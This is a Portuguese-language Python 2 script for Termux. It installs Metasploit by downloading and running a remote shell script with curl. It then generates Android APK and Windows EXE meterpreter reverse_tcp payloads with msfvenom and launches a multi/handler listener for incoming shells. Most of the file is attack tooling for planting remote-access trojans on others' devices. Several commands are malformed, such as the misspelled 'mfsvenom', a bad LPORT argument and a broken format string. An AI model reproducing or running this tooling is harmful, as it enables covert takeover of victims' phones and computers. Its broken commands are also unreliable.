#!/usr/bin/python2
# -*- coding: utf-8 -*-
import os, sys, time
from time import sleep
import os.path
def ver():
	print "verificando metasploit"
	time.sleep(0.5)
	stogare="/data/data/com.termux/files/home/storage"
	exploit="/sdcard/exploit"
	pasta="/data/data/com.termux/files/home/metasploit-framework"
	ff=str(os.path.exists(exploit))
	patch=str(os.path.exists(pasta))
	tf=str(os.path.exists(stogare))
	lista={"ff","patch","ft"}
	for item in lista:
		if tf == "False":
			os.system("termux-setup-storage")
		print "VERIFICANDO PASTA: %s"%(item)
		sleep(0.2)
		os.system("clear'")
		if ff == "False":
		    os.system("mkdir /sdcard/exploit")
		elif patch == "False":
			print "metasploit não instalado"
			print '''
			1{INSTALAR}
			2{SAIR}
			'''
			op=int(raw_input("=={"))
			if op == 1:
				print "----------------------------------------------"
				print "baixando metasploit"
				os.system("apt install curl git -y")
				os.system("curl -LO https://Auxilus.github.io/metasploit.sh")
				os.system("sh metasploit.sh")
				os.system("clear")
				print "pronto"
				ver()
			elif op == 2:
				print "saindo"
				exit(0)
				exit()
		
def menu():
	os.system("clear")
	print '''
 ____  ____  ___  ____  ____  _____ 
(  _ \( ___)/ __)( ___)(  _ \(  _  )
 )(_) ))__) \__ \ )__)  )   / )(_)( 
(____/(____)(___/(____)(_)\_)(___/\\
	'''
	print '''
1{exploit para android}
2{exploit para windows}
3{payload personalizada}
4{iniciar msfconsole}
5{sair}
	'''
	op=int(str(raw_input("OPÇÃO: ")))
	if op == 1:
		os.system('clear')
		lhost=raw_input("LHOST: ")
		lport=int(raw_input("LPORT: "))
		nome=raw_input("NOME: ")
		os.system("clear")
		print "GERANDO APK NA PASTA /SDCARD/EXPLOIT/%s.apk"%(nome)
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT:=%s R > /sdcard/exploit/%s.apk"%(lhost, lport, nome))
		os.system("clear")
		print "PRONTO"
	elif op == 2:
		os.system("clear")
		lhost=raw_input("LHOST: ")
		lport=int(raw_input("LPORT: "))
		nome=raw_input("NOME: ")
		os.system("clear")
		print "GERANDO EXE NA PASTA SDCARD/EXPLOIT/ %s"%(nome)
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s LPORT=%s R > /sdcard/exploit/%s.exe"%(lhost, lport, nome))
		os.system("clear")
		print "PRONTO"
	elif op == 3:
		os.system("clear")
		payload=raw_input("PAYLOAD: ")
		lhost=raw_input("LHOST: ")
		lport=int(raw_input("LPORT: "))
		nome=raw_input("NOME :")
		print "EX: apk, exe etc"
		fort=raw_input("FORMATO DO EXPLOIT: ")
		print "GERANDO %fort NA PASTA SDCARD/EXPLOIT/%nome"%(fort, nome)
		os.system("mfsvenom -p %payload LHOST=%s LPORT=%s R > /sdcard/exploit/%s.%s"(payload, lhost, lport, nome, fort))
		os.system("clear")
		print "PRONTO"
	elif op == 4:
		port=int(raw_input("LPORTA: "))
		payload='set payload android/meterpreter/reverse_tcp \nset lhost 0.0.0.0 \nset lport %s \nuse exploit/multi/handler \nexploit'%(port)
		os.system("echo '%s' > $HOME/payload.rb"%(payload))
		print "PARA USAR O MSGCONSOLE JA PRONTO USE O COMANDO \nmsfconsole -r payload.rb"
		time.sleep(1)
		os.system("msfconsole -r $HOME/payload.rb")
		os.system("clear")
	elif op == 5:
		print "SAINDO..."
		print "CRIADOR DO SCRIPT: elionay costa\nUSER DO TELEGRAN: @deserq0101"
		time.sleep(2)
		sys.exit(0)
	else:
		print "NameError: name '%s' is not defined"%(op)
def erro():
	try:
		menu()
	except:
		print "ERRO: 404"
ver()
menu()
erro()